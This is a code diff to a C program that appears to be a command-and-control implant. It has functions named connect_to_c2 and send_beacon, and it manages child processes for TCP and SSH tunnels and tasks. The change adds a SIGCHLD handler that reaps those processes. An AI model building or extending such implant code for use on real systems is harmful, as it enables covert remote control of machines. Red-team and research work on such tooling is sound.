@@ -8,6 +8,8 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netdb.h>
+#include <signal.h>
+#include <wait.h>
 
 #include "beacon.h"
 #include "command.h"
@@ -23,7 +25,37 @@
 #define OK 1
 
 int timeout = 15;		// seconds
-//int ID = 0; // need to ensure persistence
+extern struct process tcp_tunnel;
+extern struct process ssh_tunnel;
+extern struct process task;
+
+static void handle_sigchld(int sig)
+{
+	int saved_errno = errno;
+	int pid;
+	while ((pid = waitpid(-1, 0, WNOHANG)) > 0) {	// Possibly save exit status
+		if (pid == tcp_tunnel.pid) {
+			tcp_tunnel.is_alive = 0;
+		} else if (pid == ssh_tunnel.pid) {
+			ssh_tunnel.is_alive = 0;
+		} else if (pid == task.pid) {
+			task.is_alive = 0;
+		}
+	}
+	errno = saved_errno;
+}
+
+static int register_sigchld_handler()
+{
+	struct sigaction sa;
+	sa.sa_handler = &handle_sigchld;
+	sigemptyset(&sa.sa_mask);
+	sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
+	if (sigaction(SIGCHLD, &sa, 0) == -1)
+		return -1;
+
+	return 0;
+}
 
 int connect_to_c2(const char *host, int port)
 {
@@ -143,7 +175,12 @@ int send_beacon(int sockfd, char *request, size_t request_len)
 
 int main(int argc, char *argv[])
 {
-#define HTTP_REQ_MAX_SIZE 2048
+	printf("[*] Registering SIGCHLD handler for new process...");
+	if (register_sigchld_handler() == -1) {
+		printf(RED("failed\n"));
+		return -1;
+	}
+	printf("done\n");
 
 	printf("[*] Acquiring beacon...");
 	char *beacon = get_beacon();
@@ -153,6 +190,7 @@ int main(int argc, char *argv[])
 	}
 	printf(GREEN("done:\n") "%s", beacon);
 
+#define HTTP_REQ_MAX_SIZE 2048
 	printf("[*] Building HTTP request...");
 	char *http_req = malloc(HTTP_REQ_MAX_SIZE);
 	if (http_req == NULL) {
